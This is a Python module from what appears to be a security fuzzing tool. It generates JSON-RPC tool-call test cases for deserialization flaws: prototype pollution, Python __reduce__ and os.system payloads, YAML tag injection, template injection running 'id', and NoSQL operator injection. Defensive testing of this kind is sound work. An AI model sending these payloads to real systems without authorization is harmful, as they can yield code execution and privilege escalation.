"""
Deserialization Attack Generator — Test unsafe deserialization.

Tests for:
- Prototype pollution (JavaScript __proto__, constructor)
- Python class confusion (__class__, __reduce__)
- YAML tag injection
- JSON type confusion for deserialization sinks
"""

import json

GENERATOR_NAME = "deserialization"
GENERATOR_DESCRIPTION = "Tests for deserialization vulnerabilities"


def generate(intensity: str = "medium", **kwargs) -> list[dict]:
    cases = []

    # ── Prototype pollution (JavaScript) ─────────────────────────
    proto_payloads = [
        {"__proto__": {"admin": True}},
        {"__proto__": {"isAdmin": True}},
        {"__proto__": {"role": "admin"}},
        {"constructor": {"prototype": {"admin": True}}},
        {"__proto__": {"shell": "/bin/sh"}},
        {"__proto__": {"NODE_OPTIONS": "--require=./evil.js"}},
        {"__proto__": {"argv0": "node"}},
        {"__proto__": {"status": 200}},
        {"__proto__": {"toString": True}},
        {"__proto__": {"valueOf": True}},
        # Nested prototype pollution
        {"a": {"__proto__": {"polluted": True}}},
        {"a": {"b": {"__proto__": {"polluted": True}}}},
        # constructor chain
        {"constructor": {"prototype": {"constructor": {"prototype": {"x": True}}}}},
    ]

    for i, payload in enumerate(proto_payloads):
        cases.append({
            "name": f"prototype_pollution_{i}",
            "description": f"Prototype pollution: {list(payload.keys())[0]}",
            "payload": {
                "jsonrpc": "2.0", "id": 1,
                "method": "tools/call",
                "params": {"name": "test", "arguments": payload}
            },
            "crash_indicates_bug": True,
        })

    # ── Python class confusion ───────────────────────────────────
    python_payloads = [
        {"__class__": {"__module__": "os", "__name__": "system"}},
        {"__reduce__": ["os.system", ["id"]]},
        {"__import__": "os"},
        {"__builtins__": {"__import__": "os"}},
        {"__globals__": {"os": {"system": "id"}}},
    ]

    for i, payload in enumerate(python_payloads):
        cases.append({
            "name": f"python_deser_{i}",
            "description": f"Python deserialization: {list(payload.keys())[0]}",
            "payload": {
                "jsonrpc": "2.0", "id": 1,
                "method": "tools/call",
                "params": {"name": "test", "arguments": payload}
            },
            "crash_indicates_bug": True,
        })

    # ── YAML tag injection (as strings in JSON) ──────────────────
    yaml_tags = [
        "!!python/object/apply:os.system ['id']",
        "!!python/object/apply:subprocess.check_output [['id']]",
        "!!python/object:__main__.Exploit {}",
        "!!ruby/object:Gem::Installer",
        "!!ruby/hash",
        "!!java.lang.Runtime.exec",
        "!!javax.script.ScriptEngineManager",
    ]

    for i, tag in enumerate(yaml_tags):
        cases.append({
            "name": f"yaml_tag_{i}",
            "description": f"YAML tag injection: {tag[:40]}",
            "payload": {
                "jsonrpc": "2.0", "id": 1,
                "method": "tools/call",
                "params": {"name": "test", "arguments": {"data": tag}}
            },
            "crash_indicates_bug": True,
        })

    # ── JSON type confusion for typed languages ──────────────────
    type_confusion_payloads = [
        # String where number expected
        {"count": "NaN"},
        {"count": "Infinity"},
        {"count": "undefined"},
        {"count": "null"},
        # Object where string expected
        {"name": {"$gt": ""}},
        {"name": {"$ne": None}},
        {"name": {"$regex": ".*"}},
        # Array where object expected
        {"arguments": [1, 2, 3]},
        {"arguments": [[]]},
        # Null where required
        {"name": None, "arguments": None},
    ]

    for i, payload in enumerate(type_confusion_payloads):
        cases.append({
            "name": f"type_confusion_{i}",
            "description": f"Type confusion: {json.dumps(payload)[:50]}",
            "payload": {
                "jsonrpc": "2.0", "id": 1,
                "method": "tools/call",
                "params": payload
            },
            "crash_indicates_bug": True,
        })

    # ── Template injection strings ───────────────────────────────
    if intensity in ("high", "insane"):
        template_payloads = [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",
            "{{constructor.constructor('return this')()}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "#{T(java.lang.Runtime).getRuntime().exec('id')}",
            "__import__('os').system('id')",
            "{%import os%}{{os.popen('id').read()}}",
        ]

        for i, payload in enumerate(template_payloads):
            cases.append({
                "name": f"template_injection_{i}",
                "description": f"Template injection: {payload[:40]}",
                "payload": {
                    "jsonrpc": "2.0", "id": 1,
                    "method": "tools/call",
                    "params": {"name": "test", "arguments": {"input": payload}}
                },
                "crash_indicates_bug": True,
            })

    return cases
